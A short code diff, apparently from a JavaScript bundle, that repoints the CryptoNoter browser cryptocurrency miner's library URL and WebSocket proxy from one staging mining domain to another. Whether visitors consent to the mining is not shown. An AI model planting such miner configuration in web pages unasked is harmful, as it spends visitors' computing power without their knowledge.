@@ -489,8 +489,8 @@
 })(window);
 self.CryptoNoter = self.CryptoNoter || {};
 self.CryptoNoter.CONFIG = {
-    LIB_URL: "https://staging-mining.cryptokade.com/lib/",
-    WEBSOCKET_SHARDS: [["wss://staging-mining.cryptokade.com/proxy"]]
+    LIB_URL: "https://staging-mining.cryptocades.com/lib/",
+    WEBSOCKET_SHARDS: [["wss://staging-mining.cryptocades.com/proxy"]]
 };
 var self = this;
 var CryptoNoter = window.CryptoNoter;
